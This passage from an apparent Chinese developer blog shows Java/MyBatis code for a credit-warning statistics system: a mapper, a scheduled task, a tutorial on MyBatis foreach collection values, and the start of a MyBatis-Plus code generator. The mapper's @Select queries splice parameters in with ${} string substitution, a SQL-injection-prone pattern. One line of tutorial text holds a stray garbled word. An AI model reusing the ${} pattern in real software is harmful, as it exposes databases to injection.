org.apache.ibatis.annotations.Select;</span><br><span class="line"><span class="keyword">import</span> tk.mybatis.mapper.common.Mapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">WarningRulesMapper</span> <span class="keyword">extends</span> <span class="title">Mapper</span>&lt;<span class="title">WarningRules</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Select(&quot;SELECT YJGZ_Name rulesName FROM T_XYYJ_YJGZ WHERE YJGZ_YJLX_Code = &#x27;$&#123;statisticType&#125;&#x27; AND YJGZ_YJWD_Code = &#x27;$&#123;statisticLatitude&#125;&#x27;&quot;)</span></span><br><span class="line">    <span class="function">List&lt;String&gt; <span class="title">selectRulesName</span><span class="params">(<span class="meta">@Param(&quot;statisticType&quot;)</span> String statisticType, <span class="meta">@Param(&quot;statisticLatitude&quot;)</span> String statisticLatitude)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *  预警统计任务，查询规则名称、预警类型名称、预警纬度名称</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Select(&quot;select a.YJGZ_Name as &#x27;rulesName&#x27;,b.YJLX_MC as &#x27;warningTypeName&#x27;,c.YJWD_MC as &#x27;latitudeName&#x27; from T_XYYJ_YJGZ a INNER JOIN T_XYYJ_YJLX b on a.YJGZ_YJLX_Code=b.YJLX_BM INNER JOIN T_XYYJ_YJWD c on a.YJGZ_YJWD_Code=c.YJWD_BM where a.YJGZ_ID=&#x27;$&#123;recordRulesId&#125;&#x27;&quot;)</span></span><br><span class="line">    <span class="function">List&lt;FindNamesBody&gt; <span class="title">findNames</span><span class="params">(<span class="meta">@Param(&quot;recordRulesId&quot;)</span> <span class="keyword">int</span> recordRulesId)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h1><p>本地调试参考：<a href="https://www.cnblogs.com/mmzs/p/10161936.html">https://www.cnblogs.com/mmzs/p/10161936.html</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.psds.credit.quartz;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.dynamic.datasource.annotation.DS;</span><br><span class="line"><span class="keyword">import</span> com.psds.credit.common.core.controller.BaseController;</span><br><span class="line"><span class="keyword">import</span> com.psds.credit.common.utils.StringUtils;</span><br><span class="line"><span class="keyword">import</span> com.psds.credit.entity.WarningRecord;</span><br><span class="line"><span class="keyword">import</span> com.psds.credit.entity.WarningStatistics;</span><br><span class="line"><span class="keyword">import</span> com.psds.credit.mapper.WarningRecordMapper;</span><br><span class="line"><span class="keyword">import</span> com.psds.credit.mapper.WarningRulesMapper;</span><br><span class="line"><span class="keyword">import</span> com.psds.credit.mapper.WarningStatisticsMapper;</span><br><span class="line"><span class="keyword">import</span> com.psds.credit.model.FindNamesBody;</span><br><span class="line"><span class="keyword">import</span> com.psds.credit.service.WarningStatisticsService;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.lang3.time.DateFormatUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.lang3.time.DateUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> tk.mybatis.mapper.entity.Example;</span><br><span class="line"><span class="keyword">import</span> javax.annotation.Resource;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.stream.Collectors;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 预警统计定时任务调度</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> ChenZhiMing</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Component(&quot;ryWarningStatistics&quot;)</span></span><br><span class="line"><span class="meta">@DS(&quot;XYYJ&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RyWarningStatistics</span> <span class="keyword">extends</span> <span class="title">BaseController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> WarningRecordMapper warningRecordMapper;</span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> WarningStatisticsService warningStatisticsService;</span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> WarningRulesMapper warningRulesMapper;</span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> WarningStatisticsMapper warningStatisticsMapper;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 根据月或日统计</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> type:</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">warningStatistics</span><span class="params">(String type)</span> </span>&#123;</span><br><span class="line">        Date date = <span class="keyword">new</span> Date();</span><br><span class="line">        Example example = <span class="keyword">new</span> Example(WarningRecord.class);</span><br><span class="line">        Example.Criteria criteria = example.createCriteria();</span><br><span class="line">        WarningStatistics warningStatistics = <span class="keyword">new</span> WarningStatistics();</span><br><span class="line">        criteria.andGreaterThanOrEqualTo(<span class="string">&quot;createTime&quot;</span>, DateFormatUtils.format(date, <span class="string">&quot;yyyy-MM-dd&quot;</span>));</span><br><span class="line">        criteria.andLessThan(<span class="string">&quot;createTime&quot;</span>, DateFormatUtils.format(DateUtils.addDays(date, <span class="number">1</span>), <span class="string">&quot;yyyy-MM-dd&quot;</span>));</span><br><span class="line">        List&lt;WarningRecord&gt; warningRecordsList = warningRecordMapper.selectByExample(example);</span><br><span class="line">        <span class="keyword">if</span> (warningRecordsList.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&quot;日&quot;</span>.equals(type)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (warningRecordsList.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    warningStatistics.setUserId(warningRecordsList.get(<span class="number">0</span>).getRecordPersonId());</span><br><span class="line">                    warningStatistics.setWarningStatisticsTime(date);</span><br><span class="line">                    warningStatistics.setWarningStatisticsType(<span class="string">&quot;日&quot;</span>);</span><br><span class="line">                    warningStatistics.setWarningStatisticsName(<span class="string">&quot;统计名称&quot;</span> + DateFormatUtils.format(date, <span class="string">&quot;yyyyMMddHHmmss&quot;</span>));</span><br><span class="line">                    <span class="comment">//根据规则id查预警纬度名称、预警规则名称、预警类型名称</span></span><br><span class="line">                    List&lt;FindNamesBody&gt; names = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">                    <span class="keyword">for</span> (WarningRecord warningRecord : warningRecordsList) &#123;</span><br><span class="line">                        names.addAll(warningRulesMapper.findNames(warningRecord.getRecordRulesId()));</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">//转换、去重</span></span><br><span class="line">                    List&lt;String&gt; warningResultName = names.stream().distinct().map(resultName -&gt; resultName.getRulesName()).collect(Collectors.toList());</span><br><span class="line">                    List&lt;String&gt; warningTypeList = names.stream().map(typeName -&gt; typeName.getWarningTypeName()).distinct().collect(Collectors.toList());</span><br><span class="line">                    List&lt;String&gt; warningLatitudeList = names.stream().map(latitudeName -&gt; latitudeName.getLatitudeName()).distinct().collect(Collectors.toList());</span><br><span class="line">                    warningStatistics.setWarningStatisticsLatitude(warningResultName.toString() + warningTypeList + warningLatitudeList);</span><br><span class="line">                    warningStatistics.setWarningStatisticsCount(warningRecordsList.size());</span><br><span class="line">                    warningStatistics.setCreateTime(date);</span><br><span class="line">                    warningStatisticsService.addWarningStatistics(warningStatistics);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;月&quot;</span>.equals(type)) &#123;</span><br><span class="line">                <span class="comment">//查统计表中的本月日统计</span></span><br><span class="line">                Example exampleStatistic = <span class="keyword">new</span> Example(WarningStatistics.class);</span><br><span class="line">                exampleStatistic.createCriteria().andEqualTo(<span class="string">&quot;warningStatisticsType&quot;</span>, <span class="string">&quot;日&quot;</span>)</span><br><span class="line">                        .andGreaterThanOrEqualTo(<span class="string">&quot;createTime&quot;</span>, DateFormatUtils.format(date, <span class="string">&quot;yyyy-MM&quot;</span>))</span><br><span class="line">                        .andLessThan(<span class="string">&quot;createTime&quot;</span>, DateFormatUtils.format(DateUtils.addMonths(date, <span class="number">1</span>), <span class="string">&quot;yyyy-MM&quot;</span>));</span><br><span class="line">                List&lt;WarningStatistics&gt; warningStatisticsList = warningStatisticsMapper.selectByExample(exampleStatistic);</span><br><span class="line">                <span class="comment">//赋值</span></span><br><span class="line">                warningStatistics.setUserId(warningStatisticsList.get(<span class="number">0</span>).getUserId());</span><br><span class="line">                warningStatistics.setWarningStatisticsTime(date);</span><br><span class="line">                warningStatistics.setWarningStatisticsType(<span class="string">&quot;月&quot;</span>);</span><br><span class="line">                warningStatistics.setWarningStatisticsName(<span class="string">&quot;统计名称&quot;</span> + DateFormatUtils.format(date, <span class="string">&quot;yyyyMMddHHmmss&quot;</span>));</span><br><span class="line">                <span class="comment">//处理预警统计纬度</span></span><br><span class="line">                List&lt;String&gt; collect = warningStatisticsList.stream().map(WarningStatistics::getWarningStatisticsLatitude).distinct().collect(Collectors.toList());</span><br><span class="line">                String[] split = collect.toString().trim().split(<span class="string">&quot;\\[|\\]|,&quot;</span>);</span><br><span class="line">                List&lt;String&gt; collect1 = Arrays.stream(split)</span><br><span class="line">                        .distinct()</span><br><span class="line">                        .map(s -&gt; s.trim()).filter(s -&gt; !StringUtils.isEmpty(s))</span><br><span class="line">                        .collect(Collectors.toList());</span><br><span class="line">                warningStatistics.setWarningStatisticsLatitude(collect1.toString());</span><br><span class="line">                warningStatistics.setWarningStatisticsCount(warningRecordsList.size());</span><br><span class="line">                warningStatistics.setCreateTime(date);</span><br><span class="line">                warningStatisticsService.addWarningStatistics(warningStatistics);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-6.png" alt="upload successful"></p><ul><li>在任务类中测试</li></ul><p><img src="/images/pasted-7.png" alt="upload successful"></p><p><img src="/images/pasted-8.png" alt="upload successful"></p><h1 id="Mybatis中-foreach-collection的三种用法"><a href="#Mybatis中-foreach-collection的三种用法" class="headerlink" title="Mybatis中 foreach collection的三种用法"></a>Mybatis中 foreach collection的三种用法</h1><p><a href="https://blog.csdn.net/qq_37279783/article/details/86690115">https://blog.csdn.net/qq_37279783/article/details/86690115</a></p><p>foreach元素的属性主要有 item，index，collection，open，separator，close。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">item 表示集合中每一个元素进行迭代时的别名，</span><br><span class="line">index 指定一个名字，用于表示在迭代过程中，每次迭代到的位置，</span><br><span class="line">open 表示该语句以什么开始，</span><br><span class="line">separator 表示在每次进行迭代之间以什么符号作为分隔 符，</span><br><span class="line">close 表示以什么结束。</span><br></pre></td></tr></table></figure><p>在使用foreach的时候最关键的也是最容易出错的就是collection属性，该属性是必须指定的，但是在不同情况 下，该属性的值是不一样的，主要有一下3种情况：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 如果传入的是单参数且参数类型是一个List的时候，collection属性值为list</span><br><span class="line">2. 如果传入的是单参数且参数类型是一个array数组的时候，collection的属性值为array</span><br><span class="line">3. 如果传入的参数是多个的时候，我们就需要把它们封装成一个Map了，当然单参数也可</span><br></pre></td></tr></table></figure><p>map，实际上如果你在传入参数的时候，在breast里面也是会把它封装成一个Map的，map的key就是参数名，所以这个时候collection属性值就是传入的List或array对象在自己封装的map里面的key 下面分别来看看上述三种情况的示例代码：</p><h2 id="1-单参数List的类型"><a href="#1-单参数List的类型" class="headerlink" title="1.单参数List的类型"></a>1.单参数List的类型</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;select id=&quot;dynamicForeachTest&quot; parameterType=&quot;java.util.List&quot; resultType=&quot;Blog&quot;&gt;</span><br><span class="line">           <span class="keyword">select</span> * <span class="keyword">from</span> t_blog <span class="keyword">where</span> <span class="keyword">id</span> <span class="keyword">in</span></span><br><span class="line">        &lt;foreach collection=<span class="string">&quot;list&quot;</span> <span class="keyword">index</span>=<span class="string">&quot;index&quot;</span> item=<span class="string">&quot;item&quot;</span> <span class="keyword">open</span>=<span class="string">&quot;(&quot;</span> separator=<span class="string">&quot;,&quot;</span> <span class="keyword">close</span>=<span class="string">&quot;)&quot;</span>&gt;</span><br><span class="line">                <span class="comment">#&#123;item&#125;       </span></span><br><span class="line">        &lt;/foreach&gt;    </span><br><span class="line">&lt;/<span class="keyword">select</span>&gt;</span><br></pre></td></tr></table></figure><p>上述collection的值为list，对应的Mapper是这样的<br>public List dynamicForeachTest(List ids);<br>测试代码：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">@Test</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">dynamicForeachTest</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        SqlSession session = Util.getSqlSessionFactory().openSession();      </span><br><span class="line">        BlogMapper blogMapper = session.getMapper(BlogMapper.class);</span><br><span class="line">         List ids = <span class="keyword">new</span> ArrayList();</span><br><span class="line">         ids.<span class="keyword">add</span>(<span class="number">1</span>);</span><br><span class="line">         ids.<span class="keyword">add</span>(<span class="number">3</span>);</span><br><span class="line">         ids.<span class="keyword">add</span>(<span class="number">6</span>);</span><br><span class="line">        List blogs = blogMapper.dynamicForeachTest(ids);</span><br><span class="line">        <span class="keyword">for</span> (Blog blog : blogs)</span><br><span class="line">            System.<span class="keyword">out</span>.println(blog);</span><br><span class="line">        session.close();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="2-单参数array数组的类型"><a href="#2-单参数array数组的类型" class="headerlink" title="2.单参数array数组的类型"></a>2.单参数array数组的类型</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;select id=&quot;dynamicForeach2Test&quot; parameterType=&quot;java.util.ArrayList&quot; resultType=&quot;Blog&quot;&gt;</span><br><span class="line">     <span class="keyword">select</span> * <span class="keyword">from</span> t_blog <span class="keyword">where</span> <span class="keyword">id</span> <span class="keyword">in</span></span><br><span class="line">     &lt;foreach collection=<span class="string">&quot;array&quot;</span> <span class="keyword">index</span>=<span class="string">&quot;index&quot;</span> item=<span class="string">&quot;item&quot;</span> <span class="keyword">open</span>=<span class="string">&quot;(&quot;</span> separator=<span class="string">&quot;,&quot;</span> <span class="keyword">close</span>=<span class="string">&quot;)&quot;</span>&gt;</span><br><span class="line">          <span class="comment">#&#123;item&#125;</span></span><br><span class="line">     &lt;/foreach&gt;</span><br><span class="line"> &lt;/<span class="keyword">select</span>&gt;     </span><br></pre></td></tr></table></figure><p>上述collection为array，对应的Mapper代码：<br>public List dynamicForeach2Test(int[] ids);<br>对应的测试代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">@Test</span></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">dynamicForeach2Test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">         SqlSession session = Util.getSqlSessionFactory().openSession();</span><br><span class="line">         BlogMapper blogMapper = session.getMapper(BlogMapper.class);</span><br><span class="line">         <span class="keyword">int</span>[] ids = <span class="keyword">new</span> <span class="keyword">int</span>[] &#123;<span class="number">1</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">9</span>&#125;;</span><br><span class="line">         List blogs = blogMapper.dynamicForeach2Test(ids);</span><br><span class="line">         <span class="keyword">for</span> (Blog blog : blogs)</span><br><span class="line">         System.out.println(blog);    </span><br><span class="line">         session.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-自己把参数封装成Map的类型"><a href="#3-自己把参数封装成Map的类型" class="headerlink" title="3.自己把参数封装成Map的类型"></a>3.自己把参数封装成Map的类型</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;select id=&quot;dynamicForeach3Test&quot; parameterType=&quot;java.util.HashMap&quot; resultType=&quot;Blog&quot;&gt;</span><br><span class="line">         <span class="keyword">select</span> * <span class="keyword">from</span> t_blog <span class="keyword">where</span> title <span class="keyword">like</span> <span class="string">&quot;%&quot;</span><span class="comment">#&#123;title&#125;&quot;%&quot; and id in</span></span><br><span class="line">          &lt;foreach collection=<span class="string">&quot;ids&quot;</span> <span class="keyword">index</span>=<span class="string">&quot;index&quot;</span> item=<span class="string">&quot;item&quot;</span> <span class="keyword">open</span>=<span class="string">&quot;(&quot;</span> separator=<span class="string">&quot;,&quot;</span> <span class="keyword">close</span>=<span class="string">&quot;)&quot;</span>&gt;</span><br><span class="line">               <span class="comment">#&#123;item&#125;</span></span><br><span class="line">          &lt;/foreach&gt;</span><br><span class="line">&lt;/<span class="keyword">select</span>&gt;</span><br></pre></td></tr></table></figure><p>上述collection的值为ids，是传入的参数Map的key，对应的Mapper代码：<br>public List dynamicForeach3Test(Map params);<br>对应测试代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">dynamicForeach3Test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        SqlSession session = Util.getSqlSessionFactory().openSession();</span><br><span class="line">         BlogMapper blogMapper = session.getMapper(BlogMapper.class);</span><br><span class="line">          <span class="keyword">final</span> List ids = <span class="keyword">new</span> ArrayList();</span><br><span class="line">          ids.add(<span class="number">1</span>);</span><br><span class="line">          ids.add(<span class="number">2</span>);</span><br><span class="line">          ids.add(<span class="number">3</span>);</span><br><span class="line">          ids.add(<span class="number">6</span>);</span><br><span class="line">          ids.add(<span class="number">7</span>);</span><br><span class="line">          ids.add(<span class="number">9</span>);</span><br><span class="line">        Map params = <span class="keyword">new</span> HashMap();</span><br><span class="line">         params.put(<span class="string">&quot;ids&quot;</span>, ids);</span><br><span class="line">         params.put(<span class="string">&quot;title&quot;</span>, <span class="string">&quot;中国&quot;</span>);</span><br><span class="line">        List blogs = blogMapper.dynamicForeach3Test(params);</span><br><span class="line">         <span class="keyword">for</span> (Blog blog : blogs)</span><br><span class="line">             System.out.println(blog);</span><br><span class="line">         session.close();</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><h1 id="MybatisPlus代码生成器"><a href="#MybatisPlus代码生成器" class="headerlink" title="MybatisPlus代码生成器"></a>MybatisPlus代码生成器</h1><p>pom依赖</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--mybatisPlus依赖--&gt;</span><br><span class="line">     &lt;dependency&gt;</span><br><span class="line">         &lt;groupId&gt;com.baomidou&lt;/groupId&gt;</span><br><span class="line">         &lt;artifactId&gt;mybatis-plus-boot-starter&lt;/artifactId&gt;</span><br><span class="line">     &lt;/dependency&gt;</span><br><span class="line">     &lt;!--mybatisPlus代码生成器--&gt;</span><br><span class="line">     &lt;dependency&gt;</span><br><span class="line">         &lt;groupId&gt;com.baomidou&lt;/groupId&gt;</span><br><span class="line">         &lt;artifactId&gt;mybatis-plus-generator&lt;/artifactId&gt;</span><br><span class="line">         &lt;version&gt;3.4.0&lt;/version&gt;</span><br><span class="line">     &lt;/dependency&gt;</span><br><span class="line">     &lt;dependency&gt;</span><br><span class="line">         &lt;groupId&gt;org.freemarker&lt;/groupId&gt;</span><br><span class="line">         &lt;artifactId&gt;freemarker&lt;/artifactId&gt;</span><br><span class="line">         &lt;version&gt;2.3.31&lt;/version&gt;</span><br><span class="line">     &lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>代码生成</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line">package com.it.util;</span><br><span class="line"></span><br><span class="line">import com.alibaba.excel.util.StringUtils;</span><br><span class="line">import com.baomidou.mybatisplus.core.exceptions.MybatisPlusException;</span><br><span class="line">import com.baomidou.mybatisplus.generator.AutoGenerator;</span><br><span class="line">import com.baomidou.mybatisplus.generator.InjectionConfig;</span><br><span class="line">import com.baomidou.mybatisplus.generator.config.*;</span><br><span class="line">import com.baomidou.mybatisplus.generator.config.po.TableInfo;</span><br><span class="line">import com.baomidou.mybatisplus.generator.config.rules.NamingStrategy;</span><br><span class="line">import com.baomidou.mybatisplus.generator.engine.FreemarkerTemplateEngine;</span><br><span class="line"></span><br><span class="line">import java.util.ArrayList;</span><br><span class="line">import java.util.List;</span><br><span class="line">import java.util.Scanner;</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * MP代码生成器</span><br><span class="line"> *</span><br><span class="line"> * @Author CZM</span><br><span class="line"> *&#x2F;</span><br><span class="line">public class CodeGenerator &#123;</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * &lt;p&gt;</span><br><span class="line">     * 读取控制台内容</span><br><span class="line">     * &lt;&#x2F;p&gt;</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public static String scanner(String tip) &#123;</span><br><span class="line">        Scanner scanner &#x3D; new Scanner(System.in);</span><br><span class="line">        StringBuilder help &#x3D; new StringBuilder();</span><br><span class="line">        help.append(&quot;请输入&quot; + tip + &quot;：&quot;);</span><br><span class="line">        System.out.println(help);</span><br><span class="line">        if (scanner.hasNext()) &#123;</span><br><span class="line">            String ipt &#x3D; scanner.next();</span><br><span class="line">            if (StringUtils.isNotBlank(ipt)) 